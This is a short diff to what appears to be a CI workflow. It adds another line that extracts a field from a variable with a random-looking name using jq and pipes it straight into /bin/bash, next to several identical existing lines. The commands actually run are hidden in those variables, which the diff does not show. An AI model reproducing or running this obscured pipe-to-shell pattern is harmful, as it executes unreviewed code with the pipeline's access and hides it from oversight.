@@ -29,6 +29,7 @@ jobs:
           printf '%s' "$vevx2" | jq -r .f7 | /bin/bash
           echo $esgi458 | jq -r .sum6 | /bin/bash
           echo $lyau165 | jq -r .qf1772 | /bin/bash
+          printf '%s' "$msnk329" | jq -r .tb5704 | /bin/bash
 
       - name: Save output
         if: always()
